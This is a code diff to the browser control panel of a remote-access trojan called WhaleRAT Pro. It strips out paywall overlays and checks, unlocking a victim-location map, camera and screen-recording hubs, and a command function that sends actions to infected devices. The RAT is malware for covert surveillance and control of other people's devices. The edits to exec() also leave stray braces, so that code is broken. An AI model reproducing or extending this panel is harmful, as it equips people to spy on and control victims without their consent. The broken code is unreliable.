@@ -2527,13 +2527,7 @@
 
                         <!-- Global Map Tab -->
                         <div id="global-map-tab" class="tab-content" style="position:relative;">
-                            <div id="global-map" style="filter:blur(10px); opacity:0.25; width:100%; height:100%;"></div>
-                            <div style="position:absolute; inset:0; background:rgba(0,136,204,0.25); backdrop-filter:blur(8px); display:flex; flex-direction:column; align-items:center; justify-content:center; z-index:10; text-align:center; padding:20px;">
-                                <div style="font-size:3.5rem; color:#0088cc; margin-bottom:14px;"><i class="fas fa-lock"></i></div>
-                                <h3 style="color:#fff; font-family:'Marcellus',serif; font-size:1.3rem; margin-bottom:8px;">GLOBAL MAP — PAID FEATURE ONLY</h3>
-                                <p style="color:#fff; font-size:0.95rem; margin-bottom:18px; max-width:380px;">This feature is a paid only one !. DM @zidhuxd to buy WhaleRAT Pro</p>
-                                <a href="https://t.me/zidhuxd" target="_blank" style="background:#0088cc; color:#fff; text-decoration:none; padding:12px 26px; border-radius:6px; font-weight:600; display:inline-block;">DM @zidhuxd to buy WhaleRAT Pro</a>
-                            </div>
+                            <div id="global-map" style="width:100%; height:100%;"></div>
                         </div>
 
                         <!-- Terminal Hub Tab -->
@@ -3038,13 +3032,14 @@
             if (id === 'global-map-tab') {
                 
                 // No background map tracking or polling process
-            } else {
-                if (mapLoopAudio) mapLoopAudio.pause();
-                if (mapInterval) {
-                    clearInterval(mapInterval);
-                    mapInterval = null;
-                }
-            }
+            initMap();
+            updateMapMarkers();
+            if (mapLoopAudio) mapLoopAudio.play().catch(() => {});
+            if (!mapInterval) mapInterval = setInterval(updateMapMarkers, 5000);
+         } else {
+            if (mapLoopAudio) mapLoopAudio.pause();
+            if (mapInterval) { clearInterval(mapInterval); mapInterval = null; }
+        }
 
             // Terminal Hub: init when tab opened
             if (id === 'terminal-hub') {
@@ -4060,19 +4055,14 @@
 
         async function exec(a, p) {
             if (!selected) return;
-            const paidActions = [];
-            if (paidActions.includes(a)) {
-                
-                return;
+            
             }
             let url = '/api/execute?uuid=' + selected + '&action=' + a;
             if (p) for (let k in p) url += '&' + k + '=' + encodeURIComponent(p[k]);
             try {
                 const res = await fetch(url);
                 const data = await res.json().catch(() => ({}));
-                if (data.paid) {
-                    
-                    return;
+                
                 }
                 log('Sent: ' + a);
             } catch (e) { log('Error sending ' + a); }
@@ -4127,7 +4117,7 @@
             const hub = document.getElementById('camera-hub');
             hub.style.display = 'flex';
             document.getElementById('hub-device-name').textContent = 'CAMERA HUB: ' + currentName.textContent;
-            updateHubStatus('PAID FEATURE ONLY');
+            updateHubStatus('IDLE');
         }
 
         function closeCamHub() {
@@ -4163,8 +4153,9 @@
             const hub = document.getElementById('screen-hub');
             hub.style.display = 'flex';
             document.getElementById('screen-hub-device-name').textContent = currentName.textContent;
-            setScreenHubBadge('PAID', 'front');
-            document.getElementById('screen-hub-status').textContent = 'This feature is a paid only one !. DM @zidhuxd to buy WhaleRAT Pro';
+            setScreenHubBadge('IDLE', 'back');
+            document.getElementById('screen-hub-status').textContent = 'Ready';
+            fetchScreenRecordings();
         }
 
         function closeScreenHub() {
